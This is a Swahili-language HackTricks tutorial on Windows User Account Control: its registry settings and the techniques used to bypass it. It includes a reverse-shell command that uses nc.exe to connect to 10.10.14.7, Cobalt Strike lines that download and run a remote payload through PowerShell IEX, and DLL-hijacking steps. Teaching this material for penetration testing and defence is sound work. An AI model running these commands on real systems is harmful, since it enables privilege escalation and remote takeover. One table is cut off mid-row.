# UAC - Udhibiti wa Akaunti ya Mtumiaji

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuendesha mchakato wa kiotomatiki** uliofanywa na zana za jamii za **hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Udhibiti wa Akaunti ya Mtumiaji (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kibali cha kuthibitisha kwa shughuli zilizoongezeka**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kutekeleza kazi ambazo **zinaweza kuhatarisha mfumo**. Wakati UAC imeamilishwa, programu na kazi zote **huendeshwa chini ya muktadha wa usalama wa akaunti ya mtumiaji isiyo ya msimamizi** isipokuwa msimamizi anaidhinisha wazi programu/hizo kazi kuwa na ufikiaji wa kiwango cha msimamizi kwenye mfumo. Ni kipengele cha urahisi kinacholinda watumiaji wasimamizi kutokana na mabadiliko yasiyokusudiwa lakini haichukuliwi kama kizuizi cha usalama.

Kwa habari zaidi kuhusu viwango vya uaminifu:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Wakati UAC iko mahali pake, mtumiaji msimamizi anapewa funguo 2: funguo ya mtumiaji wa kawaida, kufanya vitendo vya kawaida kama kiwango cha kawaida, na funguo moja lenye mamlaka ya msimamizi.

[Page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) hii inajadili jinsi UAC inavyofanya kazi kwa kina na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na muundo wa UAC. Wasimamizi wanaweza kutumia sera za usalama kuwezesha jinsi UAC inavyofanya kazi kwa kampuni yao kwa kiwango cha ndani (kwa kutumia secpol.msc), au kuziweka na kuzisambaza kupitia Vitu vya Sera ya Kikundi (GPO) katika mazingira ya uwanja wa Active Directory. Mipangilio mbalimbali inajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Sera ya Kikundi ambayo inaweza kuwekwa kwa UAC. Jedwali lifuatalo lina maelezo zaidi:

| Mipangilio ya Sera ya Kikundi                                                                                                                                                                                                                                                                                                                                                   | Funguo ya Usajili           | Mipangilio ya Awali                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Udhibiti wa Akaunti ya Mtumiaji: Njia ya Kuidhinisha ya Msimamizi kwa akaunti ya Msimamizi iliyojengwa ndani](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Imezimwa                                                     |
| [Udhibiti wa Akaunti ya Mtumiaji: Ruhusu programu za UIAccess kuomba kuidhinishwa bila kutumia desktop salama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Imezimwa                                                     |
| [Udhibiti wa Akaunti ya Mtumiaji: Tabia ya onyo la kuidhinisha kwa wasimamizi katika Njia ya Kuidhinisha ya Msimamizi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Onyesha onyo la kuidhinisha kwa programu zisizo za Windows     |
| [Udhibiti wa Akaunti ya Mtumiaji: Tabia ya onyo la kuidhinisha kwa watumiaji wa kawaida](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Onyesha onyo la kuidhinisha kwa siri kwenye desktop salama    |
| [Udhibiti wa Akaunti ya Mtumiaji: Gundua ufungaji wa programu na onyesha onyo la kuidhinisha](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Imewezeshwa (chaguo-msingi kwa nyumbani) Imezimwa (chaguo-msingi kwa kampuni) |
| [Udhibiti wa Akaunti ya Mtumiaji: Kuidhinisha tu programu zilizosainiwa na kuthibitishwa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Imezimwa                                                     |
| [Udhibiti wa Akaunti ya Mtumiaji: Kuidhinisha tu programu za UIAccess zilizosanidiwa kwenye maeneo salama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Imewezeshwa                                                  |
| [Udhibiti wa Akaunti ya Mtumiaji: Endesha wasimamizi wote katika Njia ya Kuidhinisha ya Msimamizi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Imewezeshwa                                                  |
| [Udhibiti wa Akaunti ya Mtumiaji: Badilisha kwenye desktop salama wakati wa kuomba kuidhinisha](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Imewezeshwa                                                  |
| [Udhibiti wa Akaunti ya Mtumiaji
### Nadharia ya Kuepuka UAC

Baadhi ya programu zina **autoelevated kiotomatiki** ikiwa **mtumiaji anamiliki** kikundi cha **wasimamizi**. Programu hizi zina ndani yake _**Manifests**_ chaguo la _**autoElevate**_ na thamani ya _**True**_. Pia, programu lazima iwe **imesainiwa na Microsoft**.

Kwa hiyo, ili **kuepuka** UAC (kuinua kutoka kiwango cha **medium** hadi kiwango cha **juu**), baadhi ya wadukuzi hutumia programu hizi kutekeleza **nambari za kiholela** kwa sababu itatekelezwa kutoka kwa **mchakato wa kiwango cha juu cha uaminifu**.

Unaweza **kuchunguza** _**Manifest**_ ya programu kwa kutumia zana ya _**sigcheck.exe**_ kutoka Sysinternals. Na unaweza **kuona** kiwango cha uaminifu cha michakato kwa kutumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).

### Angalia UAC

Ili kuthibitisha ikiwa UAC imeamilishwa, fanya yafuatayo:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ikiwa ni **`1`** basi UAC imekuwa **imeamilishwa**, ikiwa ni **`0`** au **haipo**, basi UAC imekuwa **haiko hai**.

Kisha, angalia **kiwango gani** kimehifadhiwa:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Ikiwa **`0`**, basi UAC haitauliza (kama **imelemazwa**)
* Ikiwa **`1`**, msimamizi anaulizwa kwa jina la mtumiaji na nenosiri ili kutekeleza faili na haki za juu (kwenye Desktop Salama)
* Ikiwa **`2`** (**Daima nijulishe**), UAC itauliza daima kwa uthibitisho kwa msimamizi anapojaribu kutekeleza kitu na haki za juu (kwenye Desktop Salama)
* Ikiwa **`3`**, kama `1` lakini sio lazima kwenye Desktop Salama
* Ikiwa **`4`**, kama `2` lakini sio lazima kwenye Desktop Salama
* Ikiwa **`5`** (**chaguo-msingi**), itamwuliza msimamizi kuthibitisha kuendesha programu zisizo za Windows na haki za juu

Kisha, unapaswa kuangalia thamani ya **`LocalAccountTokenFilterPolicy`**\
Ikiwa thamani ni **`0`**, basi, mtumiaji wa RID 500 (**Msimamizi aliyejengwa**) pekee anaweza kufanya **kazi za msimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kikundi cha "Wasimamizi"** wanaweza kufanya hizo kazi.

Na mwishowe angalia thamani ya ufunguo **`FilterAdministratorToken`**\
Ikiwa **`0`** (chaguo-msingi), akaunti ya Msimamizi aliyejengwa **inaweza** kufanya kazi za utawala wa mbali na ikiwa **`1`**, akaunti ya Msimamizi aliyejengwa **haiwezi** kufanya kazi za utawala wa mbali, isipokuwa `LocalAccountTokenFilterPolicy` imewekwa kuwa `1`.

#### Muhtasari

* Ikiwa `EnableLUA=0` au **haipo**, **hakuna UAC kwa yeyote**
* Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=1` , Hakuna UAC kwa yeyote**
* Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=0`, Hakuna UAC kwa RID 500 (Msimamizi aliyejengwa)**
* Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=1`, UAC kwa kila mtu**

Taarifa hii yote inaweza kukusanywa kwa kutumia moduli ya **metasploit**: `post/windows/gather/win_privs`

Pia unaweza kuangalia vikundi vya mtumiaji wako na kupata kiwango cha uadilifu:
```
net user %username%
whoami /groups | findstr Level
```
## Kupita kwa UAC

{% hint style="info" %}
Tafadhali kumbuka kuwa ikiwa una ufikiaji wa picha kwa mwathiriwa, kupita kwa UAC ni rahisi kwani unaweza tu bonyeza "Ndiyo" wakati ombi la UAC linapoonekana.
{% endhint %}

Kupita kwa UAC kunahitajika katika hali ifuatayo: **UAC imeamilishwa, mchakato wako unakimbia katika muktadha wa kiwango cha kati, na mtumiaji wako anahusika na kikundi cha waendeshaji**.

Ni muhimu kutaja kuwa **ni ngumu zaidi kupita kwa UAC ikiwa iko katika kiwango cha usalama cha juu (Daima) kuliko ikiwa iko katika kiwango lingine lolote (Chaguo-msingi).**

### UAC imelemazwa

Ikiwa UAC tayari imelemazwa (`ConsentPromptBehaviorAdmin` ni **`0`**), unaweza **kutekeleza kitanzi cha nyuma na mamlaka ya msimamizi** (kiwango cha juu cha uaminifu) kwa kutumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Kupita kwa UAC kwa kuchanganya alama

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sana** Kimsingi "kupita" kwa UAC (upatikanaji kamili wa mfumo wa faili)

Ikiwa una kikao cha shell na mtumiaji ambaye yuko ndani ya kikundi cha Wasimamizi unaweza **kufunga C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) kwa kiwambo kipya na utakuwa na **upatikanaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Msimamizi).

{% hint style="warning" %}
**Inaonekana kama hila hii haifanyi kazi tena**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Kupita kwa UAC na cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijasanidiwa kwenye kiwango chake cha usalama wa juu.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia wana moduli kadhaa za **kupita** **UAC**.

### KRBUACBypass

Nyaraka na zana zinapatikana [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) ambayo ni **mkusanyiko** wa mbinu kadhaa za kuvuka UAC. Kumbuka kuwa utahitaji **kukusanya UACME kwa kutumia visual studio au msbuild**. Kukusanya kutazalisha faili kadhaa ya utekelezaji (kama vile `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ipi unahitaji**.\
Unapaswa **kuwa makini** kwa sababu baadhi ya njia za kuvuka zitaweka **programu nyingine** ambazo zitamwonya **mtumiaji** kuwa kitu kinatokea.

UACME ina **toleo la ujenzi ambapo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayoathiri toleo lako:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, kwa kutumia [hii](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) ukurasa unapata Windows toleo `1607` kutoka kwa matoleo ya ujenzi.

#### Mbinu zaidi za kuepuka UAC

**Zote** mbinu zinazotumiwa hapa kuepuka UAC **zinahitaji** kikao cha **shell kamili cha kuingiliana** na mwathiriwa (shell ya kawaida ya nc.exe haitoshi).

Unaweza kupata kwa kutumia kikao cha **meterpreter**. Hamia kwenye **mchakato** ambao **Session** ina thamani sawa na **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### Kuepuka UAC kwa kutumia GUI

Ikiwa una ufikiaji wa **GUI unaweza tu kukubali onyo la UAC** unapolipata, hauhitaji kuepuka. Kwa hivyo, kupata ufikiaji wa GUI kutakuruhusu kuepuka UAC.

Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa anakitumia (labda kupitia RDP) kuna **baadhi ya zana ambazo zitakuwa zinaendeshwa kama msimamizi** ambapo unaweza **kukimbia** cmd **kama msimamizi** moja kwa moja bila kuulizwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa **siri zaidi**.

### Kuepuka UAC kwa nguvu kubwa

Ikiwa hujali kuhusu kelele unaweza daima **kukimbia kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambayo **inataka kuinua ruhusa mpaka mtumiaji aikubali**.

### Kuepuka UAC kwa njia yako mwenyewe - Mbinu ya msingi ya kuepuka UAC

Ikiangalia **UACME** utaona kuwa **kuepuka UAC nyingi hutumia udhaifu wa Dll Hijacking** (hasa kuandika dll mbaya kwenye _C:\Windows\System32_). [Soma hii ili kujifunza jinsi ya kupata udhaifu wa Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Pata faili ya binary ambayo ita **autoelevate** (angalia wakati inatekelezwa inaendeshwa katika kiwango cha juu cha uaminifu).
2. Kwa kutumia procmon, tafuta matukio ya "**NAME NOT FOUND**" ambayo yanaweza kuwa hatarishi kwa **DLL Hijacking**.
3. Labda utahitaji **kuandika** DLL ndani ya **njia zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa za kuandika. Unaweza kuepuka hii kwa kutumia:
1. **wusa.exe**: Windows 7, 8 na 8.1. Inaruhusu kuchambua yaliyomo ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu zana hii inatekelezwa kutoka kiwango cha juu cha uaminifu).
2. **IFileOperation**: Windows 10.
4. Andaa **script** kuiga DLL yako ndani ya njia iliyolindwa na kutekeleza faili ya binary inayoweza kuwa na udhaifu na autoelevate.

### Mbinu nyingine ya kuepuka UAC

Inahusisha kuangalia ikiwa **binary ya autoElevated** inajaribu **kusoma** kutoka kwa **registry** jina/ njia ya **binary** au **amri** itakayotekelezwa (hii ni ya kuvutia zaidi ikiwa binary inatafuta habari hii ndani ya **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mchakato** wa kiotomatiki unaotumia zana za jamii za **hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
